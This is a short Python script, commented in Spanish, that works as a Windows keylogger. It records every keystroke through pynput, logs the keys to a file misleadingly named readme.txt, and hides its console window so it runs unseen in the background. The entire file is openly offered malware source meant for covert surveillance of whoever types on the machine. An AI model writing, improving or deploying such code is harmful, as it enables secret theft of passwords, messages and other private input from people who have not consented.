#Modulos a Importar para poder llevar a cabo la funcion de keylogger.

from time import strftime
from pynput import keyboard
import win32gui
import win32console

#Nombre del archivo, readme.txt (Se deposita de momento en la carpeta donde el Keylogger esta situado)

archivo=open("readme.txt","w+")
s= strftime("[%H:%M:%S]")

#Codigo para archivar las letras y los demas caracteres en el archivo readme.txt.

def archivar():
 tecla= ' '.join(letras)
 print(tecla)
 archivo.write(tecla)
 archivo.write(s+'\n')
 archivo.close()     
letras=[]

#Aqui se analiza que tecla se ha pulsado (Ya sea una tecla especial como el Key.backspace o una tecla como la "A")

def presiona(key):
 key1=convertir(key)
 if str(key1) =="Key.space":
            letras.append(" ")
 elif str(key1)== "Key.esc":
            print("Saliendo...")
            archivar()
            return False
 elif str(key1)== "Key.enter":
  letras.append('\n')
 elif str(key1)== "Key.backspace":
      letras.append('[<--]')
 else:
            letras.append(key1)

#Una pequeña conversion para transformarlo en str para que Python no se queje.

def convertir(key):
      if isinstance(key, keyboard.KeyCode):
            return key.char
      else:
            return str(key)

#Codigo para ocultar la ventana y ejecutar el Keylogger en segundo plano. (Pywin32)

ventana=win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana,0)

#El listener que detecta las pulsaciones de teclas. (Pynput.keyboard)

with keyboard.Listener(on_press=presiona) as listen:
 listen.join()

